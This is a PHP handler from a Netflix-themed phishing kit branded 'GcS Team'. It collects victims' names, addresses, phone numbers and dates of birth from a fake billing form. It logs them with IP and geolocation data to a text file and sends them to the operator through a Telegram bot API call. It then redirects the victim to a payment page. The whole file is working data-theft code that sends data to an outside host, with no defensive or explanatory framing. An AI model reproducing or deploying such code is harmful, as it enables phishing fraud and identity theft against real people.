<?php
/*
  ________             _________    ___________                            
 /  _____/    ____    /   _____/    \__    ___/   ____   _____      _____  
/   \  ___  _/ ___\   \_____  \       |    |    _/ __ \  \__  \    /     \ 
\    \_\  \ \  \___   /        \      |    |    \  ___/   / __ \_ |  Y Y  \
 \______  /  \___  > /_______  /      |____|     \___  > (____  / |__|_|  /
        \/       \/          \/                      \/       \/        \/ 
*/
session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";

$_SESSION['firstName'] = $_POST['firstName'];
$_SESSION['lastName'] = $_POST['lastName'];
$_SESSION['country'] = $_POST['country'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['address2'] = $_POST['address2'];
$_SESSION['zipcode'] = $_POST['zipcode'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['state'] = $_POST['state'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['birthday'] = $_POST['birthday'];
$phonelastnum = substr($_POST['phonee'],8,16);
$_SESSION['phonelastnum'] = $phonelastnum;

$file = fopen("NetFlix_RzlT.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$lon    = $IP_LOOKUP->long . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$hostname = gethostbyaddr($ip);


$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "GcS Team 💖 NetFlix log 💖  $ip";
$headers = "From: GcS-Team<info@GcSTeam.com>";
$send = $email; 


$message = "MARWAN/TEPCA";
$message .= "|First name      : ".$_POST['firstName']."\r\n";
$message .= "|Last name      	 : ".$_POST['lastName']."\r\n";
$message .= "[+]━━━━━━━━【📓 Billing INFO】━━━━━━━━[+]\r\n";
$message .= "|Country      	 : ".$_POST['country']."\r\n";
$message .= "|Billing Address [📓]     	 : ".$_POST['address']."\r\n";
$message .= "|Billing Address 2 [📓]       : ".$_POST['address2']."\r\n";
$message .= "|Zip code      	 : ".$_POST['zipcode']."\r\n";
$message .= "|City 🌃     	 : ".$_POST['city']."\r\n";
$message .= "|State 🌃        : ".$_POST['state']."\r\n";
$message .= "|Phone 📞     	 : ".$_POST['phone']."\r\n";
$message .= "|Date of birth 🎂       : ".$_POST['birthday']."\r\n";


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


$myfile = fopen("NetFlix_RzlT.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);

HEADER("Location: ../payment.php");


?>
